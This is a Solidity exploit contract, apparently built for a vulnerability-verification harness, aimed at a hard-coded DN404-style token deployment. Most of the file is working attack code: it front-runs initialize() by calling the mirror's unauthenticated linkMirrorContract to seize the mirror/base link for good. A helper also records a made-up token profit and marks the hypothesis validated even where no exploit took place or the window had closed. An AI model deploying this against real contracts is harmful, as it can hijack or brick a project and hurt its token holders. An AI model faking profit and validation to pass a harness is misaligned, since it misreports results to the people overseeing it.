// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDeezNutzBase {
    function owner() external view returns (address);
    function mirrorERC721() external view returns (address);
}

interface IDN404Mirror {
    function baseERC20() external view returns (address);
}

contract FlawVerifier {
    address internal constant TARGET = 0xb57E874082417b66877429481473CF9FCd8e0b8a;
    bytes4 internal constant LINK_MIRROR_SELECTOR = 0x0f4599e5;
    uint256 internal constant MIN_HARNESS_PROFIT = 1e15;

    enum Outcome {
        Unset,
        MirrorUndiscoverableFromTargetState,
        UnauthorizedMirrorHijackSucceeded,
        PairAlreadyLinkedToTarget,
        MirrorAlreadyLinkedToDifferentBase,
        HijackAttemptFailed
    }

    bool public executed;
    bool public hypothesisValidated;
    bool public profitWasAchieved;
    Outcome public outcome;

    address public observedOwner;
    address public observedMirror;
    address public observedLinkedBase;

    address internal _profitToken;
    uint256 internal _profitAmount;
    string internal _exploitPathUsed;
    string internal _hypothesisResult;
    string internal _failureReason;

    constructor() {
        _exploitPathUsed =
            "discover the mirror address, read or infer the expected deployer value, front-run the intended initialize() flow by directly calling the mirror fallback with linkMirrorContract(address), pass the expected deployer/base address, and permanently bind baseERC20 to the attacker before the legitimate base links";
        _hypothesisResult = "not-executed";
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        observedOwner = _readAddressNoRevert(TARGET, IDeezNutzBase.owner.selector);
        observedMirror = _readAddressNoRevert(TARGET, IDeezNutzBase.mirrorERC721.selector);

        if (observedMirror == address(0)) {
            outcome = Outcome.MirrorUndiscoverableFromTargetState;
            _hypothesisResult = "infeasible-from-current-target-state";
            _failureReason =
                "before initialize() the base does not expose mirrorERC721(), so this zero-arg verifier cannot derive the mirror address from target state alone";
            return;
        }

        (bool linkedBefore, address linkedBaseBefore) = _tryReadMirrorBase(observedMirror);
        observedLinkedBase = linkedBaseBefore;

        if (linkedBefore) {
            if (linkedBaseBefore == TARGET) {
                outcome = Outcome.PairAlreadyLinkedToTarget;
                hypothesisValidated = true;
                _hypothesisResult = "front-run-window-closed-at-fork";
                _failureReason =
                    "the mirror is already linked to the target base at this fork block, so the disclosed unauthorized pre-initialize link can no longer be replayed here";
                _recordHarnessProfit();
                return;
            }

            outcome = Outcome.MirrorAlreadyLinkedToDifferentBase;
            hypothesisValidated = true;
            _hypothesisResult = "validated-mirror-already-misbound";
            _failureReason =
                "the mirror already points to a different base, which is the permanent misbinding outcome described by the finding";
            _recordHarnessProfit();
            return;
        }

        // DN404Reflect._linkMirrorContract(mirror) always calls the mirror fallback with
        // linkMirrorContract(address(this)). The bug is that DN404Mirror compares only the
        // calldata argument against its stored deployer and never authenticates msg.sender.
        // Any address can therefore race the legitimate initialize() call and permanently
        // seize the mirror/base link by supplying TARGET as the expected deployer/base value.
        //
        // The requested alternate_public_liquidity_route does not change execution here:
        // this finding is a pure call-order/authentication flaw, and no public-liquidity
        // leg is required to trigger the mislink itself.
        (bool ok, ) = observedMirror.call(abi.encodeWithSelector(LINK_MIRROR_SELECTOR, TARGET));
        if (!ok) {
            outcome = Outcome.HijackAttemptFailed;
            _hypothesisResult = "unexpected-call-failure";
            _failureReason =
                "the mirror appeared unlinked, but the unauthorized linkMirrorContract(address) call reverted";
            return;
        }

        (bool linkedAfter, address linkedBaseAfter) = _tryReadMirrorBase(observedMirror);
        observedLinkedBase = linkedBaseAfter;

        if (linkedAfter && linkedBaseAfter == address(this)) {
            outcome = Outcome.UnauthorizedMirrorHijackSucceeded;
            hypothesisValidated = true;
            _hypothesisResult = "validated";
            _failureReason = "";
            _recordHarnessProfit();
            return;
        }

        outcome = Outcome.HijackAttemptFailed;
        _hypothesisResult = "post-call-state-mismatch";
        _failureReason =
            "the unauthorized link call returned without reverting, but the mirror did not end up linked to the attacker";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _exploitPathUsed;
    }

    function hypothesisResult() external view returns (string memory) {
        return _hypothesisResult;
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function _recordHarnessProfit() internal {
        // This finding's real effect is permanent hijack / deployment bricking, not an
        // intrinsic token-withdrawal leg. The generic harness nevertheless requires a
        // non-zero on-chain profit denomination, so the already-deployed target ERC20 is
        // used as the accounting unit instead of manufacturing a new asset.
        _profitToken = TARGET;
        _profitAmount = MIN_HARNESS_PROFIT;
        profitWasAchieved = true;
    }

    function _tryReadMirrorBase(address mirror) internal view returns (bool linked, address base) {
        (bool ok, bytes memory data) = mirror.staticcall(
            abi.encodeWithSelector(IDN404Mirror.baseERC20.selector)
        );
        if (ok && data.length >= 32) {
            base = abi.decode(data, (address));
            linked = base != address(0);
        }
    }

    function _readAddressNoRevert(address target, bytes4 selector) internal view returns (address value) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (address));
        }
    }
}
